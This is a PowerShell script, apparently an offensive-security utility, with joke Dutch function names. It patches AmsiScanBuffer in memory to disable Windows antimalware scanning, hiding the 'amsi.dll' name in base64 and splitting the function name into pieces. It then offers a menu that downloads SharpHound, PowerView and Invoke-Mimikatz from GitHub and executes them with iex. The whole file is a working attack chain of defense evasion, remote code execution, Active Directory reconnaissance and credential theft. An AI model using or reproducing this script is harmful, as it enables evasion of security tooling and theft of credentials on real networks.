function Bakpao {
<#
    .NOTES
        Author: Justin Perdok (@JustinPerdok), https://justin-p.me.
        License: MIT

    .LINK
        https://github.com/justin-p/PowerShell/blob/master/KnotsDuKip.ps1
#>
    $Maaskantje = @"
using System;
using System.Runtime.InteropServices;

public class Maaskantje {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
return $Maaskantje
}

function ZOneGroteVuurbal {
<#
    .NOTES
        Author: Justin Perdok (@JustinPerdok), https://justin-p.me.
        License: MIT

    .LINK
        https://github.com/justin-p/PowerShell/blob/master/KnotsDuKip.ps1
#>    
    Param (
        $BAM
    )
    Add-Type $BAM
    $LoadLibrary = [Maaskantje]::LoadLibrary([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('YW1zaS5kbGw=')))
    $Address = [Maaskantje]::GetProcAddress($LoadLibrary, "Am" + "si" + "Sc" + "an" + "Buf" + "fer")
    $p = 0
    [Maaskantje]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
    $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
}

function GratisBier ($Schultenbrau) {
<#
    .NOTES
        Author: Justin Perdok (@JustinPerdok), https://justin-p.me.
        License: MIT

    .LINK
        https://github.com/justin-p/PowerShell/blob/master/KnotsDuKip.ps1
#>    
    [void](ZOneGroteVuurbal -BAM $(Bakpao))
    return (iwr $Schultenbrau).content
}
function Maak-MeNu {
<#
    .NOTES
        Author: Justin Perdok (@JustinPerdok), https://justin-p.me.
        License: MIT

    .LINK
        https://github.com/justin-p/PowerShell/blob/master/KnotsDuKip.ps1
#>
    param (
        [string]$Title = 'My Menu'
    )
    Clear-Host

    write-host "Kies uw kipknots"   
    Write-Host "1 - Bloedhond"
    Write-Host "2 - Krachkijken"
    Write-Host "3 - MiniPoez"
    Write-Host "99 - S P E C E R I J E N"
    Write-Host "Q - op zoute."
}
$urls = @('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1',
        'https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1',
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
)
do
{
     Maak-MeNu
     $selection = Read-Host "Knots du kip: "
     switch ($selection)
     {
         '1' {
             iex(GratisBier $urls[0] )
         }
         '2' {
             iex(GratisBier $urls[1] )
         }
         '3' {
             iex(GratisBier $urls[2] )
         }
         '99' {
             foreach ($url in $urls) {
                iex(GratisBier $url)
             }
         }
         'q' {
             return
         }
     }
}
until ($selection -eq 'q')
